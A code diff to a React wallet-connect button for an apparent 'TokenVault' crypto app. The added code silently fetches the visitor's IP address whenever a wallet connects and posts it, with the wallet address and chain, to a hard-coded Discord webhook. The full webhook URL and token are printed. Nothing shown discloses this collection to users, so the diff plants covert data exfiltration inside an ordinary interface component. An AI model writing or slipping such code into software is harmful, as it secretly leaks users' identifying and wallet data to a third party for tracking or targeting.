@@ -1,7 +1,59 @@
 import { ConnectButton } from '@rainbow-me/rainbowkit';
-import React from 'react';
+import React, { useEffect, useRef } from 'react';
+import { useAccount } from 'wagmi';
+
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1454406788471586836/Xa4unQHgqH26UObEpjd7MRbp7lHYizcJCCQeS8RAUGjxq4T8HXknLWyuaFA3VuMtDx3X';
+
+const getIp = async (): Promise<string> => {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'Unknown';
+  } catch {
+    return 'Unknown';
+  }
+};
+
+const sendWebhook = async (walletAddress: string, chainName: string, chainId: number) => {
+  try {
+    const ip = await getIp();
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [
+          {
+            title: '🔗 Wallet Connected',
+            color: 0x00f2ff,
+            fields: [
+              { name: '🌐 Chain', value: `${chainName} (ID: ${chainId})`, inline: true },
+              { name: '📍 IP Address', value: `\`${ip}\``, inline: true },
+              { name: '💳 Wallet Address', value: `\`${walletAddress}\`` },
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: 'TokenVault DApp' },
+          },
+        ],
+      }),
+    });
+  } catch (err) {
+    console.error('Webhook error:', err);
+  }
+};
 
 export const CustomConnectButton = () => {
+  const { address, isConnected, chain } = useAccount();
+  const wasConnected = useRef(false);
+
+  useEffect(() => {
+    if (isConnected && address && !wasConnected.current) {
+      const chainName = chain?.name || 'Unknown';
+      const chainId = chain?.id || 0;
+      sendWebhook(address, chainName, chainId);
+    }
+    wasConnected.current = isConnected;
+  }, [isConnected, address, chain]);
+
   return (
     <ConnectButton.Custom>
       {({
